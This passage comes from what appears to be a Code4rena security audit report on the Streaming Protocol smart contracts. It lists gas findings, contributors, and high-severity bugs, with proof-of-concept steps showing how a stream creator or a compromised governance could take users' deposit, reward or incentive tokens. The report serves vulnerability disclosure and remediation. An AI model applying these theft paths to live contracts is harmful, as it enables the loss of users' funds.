href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/189\">[G-08] Not needed lastApplicableTime call in claimReward</a> <em>Submitted by 0x0x0x</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/190\">[G-09] In claimReward, reward can be cached more efficiently.</a> <em>Submitted by 0x0x0x</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/33\">[G-10] Use const instead of storage</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/36\">[G-11] Dead code</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/54\">[G-12] Avoid multiple cast</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/57\">[G-13] Remove dead code</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/58\">[G-14] Delete unnecessary variable</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/50\">[G-15] Flashloan is given for 1 token but checks balances for both reward and deposit token</a> <em>Submitted by pedroais, also found by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/89\">[G-16] Remove redundant math to save gas in dilutedBalance()</a> <em>Submitted by GeekyLumberjack</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/93\">[G-17] Remove unneeded variable in creatorClaimSoldTokens() to save gas</a> <em>Submitted by GeekyLumberjack</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/42\">[G-18] Struct TokenStream remove unused variable merkleAccess</a> <em>Submitted by GiveMeTestEther, also found by Jujic and mtz</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/44\">[G-19] Cache the return value from rewardPerToken()</a> <em>Submitted by GiveMeTestEther</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/45\">[G-20] Stream constructor reuse the function arguments instead storage variables</a> <em>Submitted by GiveMeTestEther</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/46\">[G-21] Subtraction can be done unchecked because the require statement checks for underflow</a> <em>Submitted by GiveMeTestEther</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/104\">[G-22] Caching variables</a> <em>Submitted by Jujic</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/96\">[G-23] Use one require instead of  several</a> <em>Submitted by Jujic</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/137\">[G-24] [Gas optimization] remove command less else in an if else</a> <em>Submitted by Omik, also found by gzeon, and pauliax</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/231\">[G-25] Use immutable variables can save gas</a> <em>Submitted by WatchPug, also found by pauliax, pedroais, and robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/232\">[G-26] Cache and read storage variables from the stack can save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/233\">[G-27] Remove unnecessary variables can make the code simpler and save some gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/235\">[G-28] Slot packing increases runtime gas consumption due to masking</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/238\">[G-29] Adding unchecked directive can save gas</a> <em>Submitted by WatchPug, also found by defsec, hyh, and pauliax</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/239\">[G-30] <code>LockeERC20.sol#toString()</code> Implementation can be simpler and save some gas</a> <em>Submitted by WatchPug, also found by 0x0x0x</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/245\">[G-31] Avoid unnecessary storage reads can save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/248\">[G-32] <code>10**6</code> can be changed to <code>1e6</code> and save some gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/250\">[G-33] Redundant code</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/259\">[G-34] <code>Stream#claimReward()</code> storage writes and reads of <code>ts.rewards</code> can be combined into one</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/262\">[G-35] Avoid unnecessary external calls can save gas</a> <em>Submitted by WatchPug, also found by gzeon and toastedsteaksandwich</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/263\">[G-36] <code>++currStreamId</code> is more gas efficient than <code>currStreamId += 1</code></a> <em>Submitted by WatchPug, also found by cmichel</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/265\">[G-37] Remove unnecessary function can make the code simpler and save some gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/168\">[G-38] <code>arbitraryCall</code> does not need to check returned byte</a> <em>Submitted by bitbopper, also found by ye0lde</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/216\">[G-39] Gas: <code>unstreamed</code> not needed</a> <em>Submitted by cmichel</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/217\">[G-40] Gas: Check <code>_feePercent</code> instead</a> <em>Submitted by cmichel</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/131\">[G-52] Structs can be rearranged to save gas</a> <em>Submitted by cyberboy</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/255\">[G-53] Gas Optimization On The 2^256-1</a> <em>Submitted by defsec</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/127\">[G-41] Use local variable in fundStream()</a> <em>Submitted by gpersoon</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/181\">[G-42] Gas Optimization: Move common logic out of if block</a> <em>Submitted by gzeon</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/183\">[G-43] Gas Optimization: Use minimal proxy</a> <em>Submitted by gzeon</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/119\">[G-44] claimReward unnessary logic</a> <em>Submitted by harleythedog</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/67\">[G-45] Stream.updateStreamInternal performs extra storage reads</a> <em>Submitted by hyh</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/70\">[G-46] Stream.claimReward can be simplified</a> <em>Submitted by hyh</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/100\">[G-47] Unnecessary call to lastApplicableTime() in claimReward()</a> <em>Submitted by kenzo</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/99\">[G-48] No need to temporarily save old values when updating settings</a> <em>Submitted by kenzo</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/179\">[G-49] Eliminate amt in fundStream</a> <em>Submitted by pauliax</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/7\">[G-50] Internal functions to private</a> <em>Submitted by robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/142\">[G-51] Use existing memory version of state variables (Locke.sol)</a> <em>Submitted by ye0lde</em></li>\n</ul>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-10\">High Risk Findings (10)</a></p>\n<ul>\n<li><a href=\"#h-01-wrong-calculation-of-excess-deposittoken-allows-stream-creator-to-retrieve-deposittokenflashloanfeeamount-which-may-cause-fund-loss-to-users\">[H-01] Wrong calculation of excess depositToken allows stream creator to retrieve <code>depositTokenFlashloanFeeAmount</code>, which may cause fund loss to users</a></li>\n<li><a href=\"#h-02-tokens-can-be-stolen-when-deposittoken--rewardtoken\">[H-02] Tokens can be stolen when <code>depositToken == rewardToken</code></a></li>\n<li><a href=\"#h-03-reward-token-not-correctly-recovered\">[H-03] Reward token not correctly recovered</a></li>\n<li><a href=\"#h-04-improper-implementation-of-arbitrarycall-allows-protocol-gov-to-steal-funds-from-users-wallets\">[H-04] Improper implementation of <code>arbitraryCall()</code> allows protocol gov to steal funds from users’ wallets</a></li>\n<li><a href=\"#h-05-possible-incentive-theft-through-the-arbitrarycall-function\">[H-05] Possible incentive theft through the arbitraryCall() function</a></li>\n<li><a href=\"#h-06-creating-rewardtokens-without-streaming-deposittokens\">[H-06] Creating rewardTokens without streaming depositTokens</a></li>\n<li><a href=\"#h-07-business-logic-bug-in-__abdicate-function---2-bugs\">[H-07] Business logic bug in __abdicate() function - 2 Bugs</a></li>\n<li><a href=\"#h-08-tstokens-sometimes-calculated-incorrectly\">[H-08] ts.tokens sometimes calculated incorrectly</a></li>\n<li><a href=\"#h-09-dos-while-dealing-with-erc20-when-valueie-amountdecimals--is-high-but-less-than-typeuint112max\">[H-09] DOS while dealing with erc20 when value(i.e amount*decimals)  is high but less than type(uint112).max</a></li>\n<li><a href=\"#h-10-recovertokens-doesnt-work-when-issale-is-true\">[H-10] recoverTokens doesn’t work when isSale is true</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-5\">Medium Risk Findings (5)</a></p>\n<ul>\n<li><a href=\"#m-01-lockeerc20-is-vulnerable-to-frontrun-attack\">[M-01] LockeERC20 is vulnerable to frontrun attack</a></li>\n<li><a href=\"#m-02-any-arbitrarycall-gathered-airdrop-can-be-stolen-with-recovertokens\">[M-02] Any arbitraryCall gathered airdrop can be stolen with recoverTokens</a></li>\n<li><a href=\"#m-03-this-protocol-doesnt-support-all-fee-on-transfer-tokens\">[M-03] This protocol doesn’t support all fee on transfer tokens</a></li>\n<li><a href=\"#m-04-arbitrarycall-can-get-blocked-by-an-attacker\">[M-04] arbitraryCall() can get blocked by an attacker</a></li>\n<li><a href=\"#m-05-storage-variable-unstreamed-can-be-artificially-inflated\">[M-05] Storage variable unstreamed can be artificially inflated</a></li>\n</ul>\n</li>\n<li><a href=\"#low-risk-findings-27\">Low Risk Findings (27)</a></li>\n<li><a href=\"#non-critical-findings-23\">Non-Critical Findings (23)</a></li>\n<li><a href=\"#gas-optimizations-53\">Gas Optimizations (53)</a></li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 code contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the code contest outlined in this document, C4 conducted an analysis of Streaming Protocol contest smart contract system written in Solidity. The code contest took place between November 30—December 7 2021.\n\n## Wardens\n\n38 Wardens contributed reports to the Streaming Protocol contest:\n\n1. [hack3r-0m](https://twitter.com/hack3r_0m)\n1. bitbopper\n1. WatchPug ([jtp](https://github.com/jack-the-pug) and [ming](https://github.com/mingwatch))\n1. [gpersoon](https://twitter.com/gpersoon)\n1. hyh\n1. [cyberboy](https://twitter.com/cyberboyIndia)\n1. [Meta0xNull](https://twitter.com/Meta0xNull)\n1. [kenzo](https://twitter.com/KenzoAgada)\n1. 0x0x0x\n1. Jujic\n1. pedroais\n1. [cmichel](https://twitter.com/cmichelio)\n1. [defsec](https://twitter.com/defsec_)\n1. [gzeon](https://twitter.com/gzeon)\n1. [pauliax](https://twitter.com/SolidityDev)\n1. [GiveMeTestEther](https://twitter.com/GiveMeTestEther)\n1. GeekyLumberjack\n1. ScopeLift ([wildmolasses](https://github.com/wildmolasses), [bendi](https://twitter.com/BenDiFrancesco), and [mds1](https://twitter.com/msolomon44/)) \n1. harleythedog\n1. 0x1f8b\n1. [Ruhum](https://twitter.com/0xruhum)\n1. hubble (ksk2345 and shri4net) \n1. [wuwe1](https://twitter.com/wuwe19)\n1. [itsmeSTYJ](https://twitter.com/itsmeSTYJ)\n1. [jonah1005](https://twitter.com/jonah1005w)\n1. [toastedsteaksandwich](https://twitter.com/AshiqAmien)\n1. [Omik](https://twitter.com/omikomikomik)\n1. jayjonah8\n1. egjlmn1\n1. robee\n1. [csanuragjain](https://twitter.com/csanuragjain)\n1. mtz\n1. [ye0lde](https://twitter.com/_ye0lde)\n1. [pmerkleplant](https://twitter.com/merkleplant_eth)\n1. [danb](https://twitter.com/danbinnun)\n1. pants\n\nThis contest was judged by [0xean](https://github.com/0xean).\n\nFinal report assembled by [itsmetechjay](https://twitter.com/itsmetechjay) and [CloudEllie](https://twitter.com/CloudEllie1).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 42 unique vulnerabilities and 118 total findings. All of the issues presented here are linked back to their original finding.\n\nOf these vulnerabilities, 10 received a risk rating in the category of HIGH severity, 5 received a risk rating in the category of MEDIUM severity, and 27 received a risk rating in the category of LOW severity.\n\nC4 analysis also identified 23 non-critical recommendations and 53 gas optimizations.\n\n# Scope\n\nThe code under review can be found within the [C4 Streaming Protocol contest repository](https://github.com/code-423n4/2021-11-streaming), and is composed of 3 smart contracts written in the Solidity programming language and includes ~880 source lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code423n4.com).\n\n# High Risk Findings (10)\n## [[H-01] Wrong calculation of excess depositToken allows stream creator to retrieve `depositTokenFlashloanFeeAmount`, which may cause fund loss to users](https://github.com/code-423n4/2021-11-streaming-findings/issues/241)\n_Submitted by WatchPug, also found by 0x0x0x, ScopeLift, gpersoon, harleythedog, hyh, gzeon, jonah1005, and kenzo_\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654-L654>\n\n```solidity\nuint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n```\n\nIn the current implementation, `depositTokenFlashloanFeeAmount` is not excluded when calculating `excess` depositToken. Therefore, the stream creator can call `recoverTokens(depositToken, recipient)` and retrieve `depositTokenFlashloanFeeAmount` if there are any.\n\nAs a result:\n\n*   When the protocol `governance` calls `claimFees()` and claim accumulated `depositTokenFlashloanFeeAmount`, it may fail due to insufficient balance of depositToken.\n*   Or, part of users' funds (depositToken) will be transferred to the protocol `governance` as fees, causing some users unable to withdraw or can only withdraw part of their deposits.\n\n#### Proof of Concept\n\nGiven:\n\n*   `feeEnabled`: true\n*   `feePercent`: 10 (0.1%)\n\n1.  Alice deposited `1,000,000` depositToken;\n2.  Bob called `flashloan()` and borrowed `1,000,000` depositToken, then repaid `1,001,000`;\n3.  Charlie deposited `1,000` depositToken;\n4.  After `endDepositLock`, Alice called `claimDepositTokens()` and withdrawn `1,000,000` depositToken;\n5.  `streamCreator` called `recoverTokens(depositToken, recipient)` and retrieved `1,000` depositToken `(2,000 - (1,001,000 - 1,000,000))`;\n6.  `governance` called `claimFees()` and retrieved another `1,000` depositToken;\n7.  Charlie tries to `claimDepositTokens()` but since the current balanceOf depositToken is `0`, the transcation always fails, and Charlie loses all the depositToken.\n\n#### Recommendation\n\nChange to:\n\n```solidity\nuint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens) - depositTokenFlashloanFeeAmount;\n```\n\n**[brockelmore (Streaming Protocol) confirmed](https://github.com/code-423n4/2021-11-streaming-findings/issues/241#issuecomment-989271468)**\n\n\n\n## [[H-02] Tokens can be stolen when `depositToken == rewardToken`](https://github.com/code-423n4/2021-11-streaming-findings/issues/215)\n_Submitted by cmichel, also found by 0x0x0x, gzeon, Ruhum, gpersoon, hack3r-0m, and pauliax_\n\nThe `Streaming` contract allows the `deposit` and `reward` tokens to be the same token.\n\n> I believe this is intended, think Sushi reward on Sushi as is the case with `xSushi`.\n\nThe reward and deposit balances are also correctly tracked independently in `depositTokenAmount` and `rewardTokenAmount`.\nHowever, when recovering tokens this leads to issues as the token is recovered twice, once for deposits and another time for rewards:\n\n```solidity\nfunction recoverTokens(address token, address recipient) public lock {\n    // NOTE: it is the stream creators responsibility to save\n    // tokens on behalf of their users.\n    require(msg.sender == streamCreator, \"!creator\");\n    if (token == depositToken) {\n        require(block.timestamp > endDepositLock, \"time\");\n        // get the balance of this contract\n        // check what isnt claimable by either party\n        // @audit-info depositTokenAmount updated on stake/withdraw/exit, redeemedDepositTokens increased on claimDepositTokens\n        uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n        // allow saving of the token\n        ERC20(token).safeTransfer(recipient, excess);\n\n        emit RecoveredTokens(token, recipient, excess);\n        return;\n    }\n    \n    if (token == rewardToken) {\n        require(block.timestamp > endRewardLock, \"time\");\n        // check current balance vs internal balance\n        //\n        // NOTE: if a token rebases, i.e. changes balance out from under us,\n        // most of this contract breaks and rugs depositors. this isn't exclusive\n        // to this function but this function would in theory allow someone to rug\n        // and recover the excess (if it is worth anything)\n\n        // check what isnt claimable by depositors and governance\n        // @audit-info rewardTokenAmount increased on fundStream\n        uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);\n        ERC20(token).safeTransfer(recipient, excess);\n\n        emit RecoveredTokens(token, recipient, excess);\n        return;\n    }\n    // ...\n```\n\n#### Proof Of Concept\n\nGiven `recoverTokens == depositToken`, `Stream` creator calls `recoverTokens(token = depositToken, creator)`.\n\n*   The `token` balance is the sum of deposited tokens (minus reclaimed) plus the reward token amount. `ERC20(token).balanceOf(address(this)) >= (depositTokenAmount - redeemedDepositTokens) + (rewardTokenAmount + rewardTokenFeeAmount)`\n*   `if (token == depositToken)` executes, the `excess` from the deposit amount will be the reward amount (`excess >= rewardTokenAmount + rewardTokenFeeAmount`). This will be transferred.\n*   `if (token == rewardToken)` executes, the new token balance is just the deposit token amount now (because the reward token amount has been transferred out in the step before). Therefore, `ERC20(token).balanceOf(address(this)) >= depositTokenAmount - redeemedDepositTokens`. If this is non-negative, the transaction does not revert and the creator makes a profit.\n\nExample:\n\n*   outstanding redeemable deposit token amount: `depositTokenAmount - redeemedDepositTokens = 1000`\n*   funded `rewardTokenAmount` (plus `rewardTokenFeeAmount` fees): `rewardTokenAmount + rewardTokenFeeAmount = 500`\n\nCreator receives `1500 - 1000 = 500` excess deposit and `1000 - 500 = 500` excess reward.\n\n#### Impact\n\nWhen using the same deposit and reward token, the stream creator can steal tokens from the users who will be unable to withdraw their profit or claim their rewards.\n\n#### Recommended Mitigation Steps\n\nOne needs to be careful with using `.balanceOf` in this special case as it includes both deposit and reward balances.\n\nAdd a special case for `recoverTokens` when `token == depositToken == rewardToken` and then the excess should be `ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens) - (rewardTokenAmount + rewardTokenFeeAmount);`\n\n**[brockelmore (Streaming Protocol) confirmed](https://github.com/code-423n4/2021-11-streaming-findings/issues/215#issuecomment-989276002)**\n\n\n\n## [[H-03] Reward token not correctly recovered](https://github.com/code-423n4/2021-11-streaming-findings/issues/214)\n_Submitted by cmichel, also found by GeekyLumberjack, kenzo, pedroais, and hyh_\n\nThe `Streaming` contract allows recovering the reward token by calling `recoverTokens(rewardToken, recipient)`.\n\nHowever, the excess amount is computed incorrectly as `ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount)`:\n\n```solidity\nfunction recoverTokens(address token, address recipient) public lock {\n    if (token == rewardToken) {\n        require(block.timestamp > endRewardLock, \"time\");\n\n        // check what isnt claimable by depositors and governance\n        // @audit-issue rewardTokenAmount increased on fundStream, but never decreased! this excess underflows\n        uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);\n        ERC20(token).safeTransfer(recipient, excess);\n\n        emit RecoveredTokens(token, recipient, excess);\n        return;\n    }\n    // ...\n```\n\nNote that `rewardTokenAmount` only ever *increases* (when calling `fundStream`) but it never decreases when claiming the rewards through `claimReward`.\nHowever, `claimReward` transfers out the reward token.\n\nTherefore, the `rewardTokenAmount` never tracks the contract's reward balance and the excess cannot be computed that way.\n\n#### Proof Of Concept\n\nAssume no reward fees for simplicity and only a single user staking.\n\n*   Someone funds `1000` reward tokens through `fundStream(1000)`. Then `rewardTokenAmount = 1000`\n*   The stream and reward lock period is over, i.e. `block.timestamp > endRewardLock`\n*   The user claims their full reward and receives `1000` reward tokens by calling `claimReward()`. The reward contract balance is now `0` but `rewardTokenAmount = 1000`\n*   Some fool sends 1000 reward tokens to the contract by accident. These cannot be recovered as the `excess = balance - rewardTokenAmount = 0`\n\n#### Impact\n\nReward token recovery does not work.\n\n#### Recommended Mitigation Steps\n\nThe claimed rewards need to be tracked as well, just like the claimed deposits are tracked.\nI think you can even decrease `rewardTokenAmount` in `claimReward` because at this point `rewardTokenAmount` is not used to update the `cumulativeRewardPerToken` anymore.\n\n**[brockelmore (Streaming Protocol) confirmed](https://github.com/code-423n4/2021-11-streaming-findings/issues/214#issuecomment-989285321)**\n\n\n\n## [[H-04] Improper implementation of `arbitraryCall()` allows protocol gov to steal funds from users' wallets](https://github.com/code-423n4/2021-11-streaming-findings/issues/258)\n_Submitted by WatchPug, also found by Jujic and hack3r-0m_\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L733-L735>\n\n```solidity\nfunction arbitraryCall(address who, bytes memory data) public lock externallyGoverned {\n    // cannot have an active incentive for the callee\n    require(incentives[who] == 0, \"inc\");\n    ...\n```\n\nWhen an incentiveToken is claimed after `endStream`, `incentives[who]` will be `0` for that `incentiveToken`.\n\nIf the protocol gov is malicious or compromised, they can call `arbitraryCall()` with the address of the incentiveToken as `who` and `transferFrom()` as calldata and steal all the incentiveToken in the victim's wallet balance up to the allowance amount.\n\n#### Proof of Concept\n\n1.  Alice approved `USDC` to the streaming contract;\n2.  Alice called `createIncentive()` and added `1,000 USDC` of incentive;\n3.  After the stream is done, the stream creator called `claimIncentive()` and claimed `1,000 USDC`;\n\nThe compromised protocol gov can call `arbitraryCall()` and steal all the USDC in Alice's wallet balance.\n\n#### Recommendation\n\nConsider adding a mapping: `isIncentiveToken`, setting `isIncentiveToken[incentiveToken] = true` in `createIncentive()`, and `require(!isIncentiveToken[who], ...)` in `arbitraryCall()`.\n\n**[brockelmore (Streaming Protocol) confirmed](https://github.com/code-423n4/2021-11-streaming-findings/issues/258#issuecomment-989281413)**\n\n\n\n## [[H-05] Possible incentive theft through the arbitraryCall() function](https://github.com/code-423n4/2021-11-streaming-findings/issues/199)\n_Submitted by toastedsteaksandwich, also found by Omik, ScopeLift, bitbopper, pedroais, gzeon, Meta0xNull, and wuwe1_\n\n#### Impact\n\nThe `Locke.arbitraryCall()` function allows the inherited governance contract to perform arbitrary contract calls within certain constraints. Contract calls to tokens provided as incentives through the createIncentive() function are not allowed if there is some still some balance according to the incentives mapping (See line 735 referenced below).\n\nHowever, the token can still be called prior any user creating an incentive, so it's possible for the `arbitraryCall()` function to be used to set an allowance on an incentive token before the contract has actually received any of the token through `createIncentive()`.\n\nIn summary:\n\n1.  If some possible incentive tokens are known prior to being provided, the `arbitraryCall()` function can be used to pre-approve a token allowance for a malicious recipient.\n2.  Once a user calls `createIncentive()` and provides one of the pre-approved tokens, the malicious recipient can call `transferFrom` on the provided incentive token and withdraw the tokens.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L735>\n\n#### Recommended Mitigation Steps\n\n##### Recommendation 1\n\nLimit the types of incentive tokens so it can be checked that it's not the target contract for the arbitraryCall().\n\n##### Recommendation 2\n\nValidate that the allowance of the target contract (if available) has not changed.\n\n**[brockelmore (Streaming Protocol) confirmed](https://github.com/code-423n4/2021-11-streaming-findings/issues/199#issuecomment-989280130)**\n\n\n\n## [[H-06] Creating rewardTokens without streaming depositTokens](https://github.com/code-423n4/2021-11-streaming-findings/issues/166)\n_Submitted by bitbopper_\n\n#### Impact\n\n`stake` and `withdraws` can generate rewardTokens without streaming depositTokens.\nIt does not matter whether the stream is a sale or not.\n\nThe following lines can increase the reward balance on a `withdraw` some time after 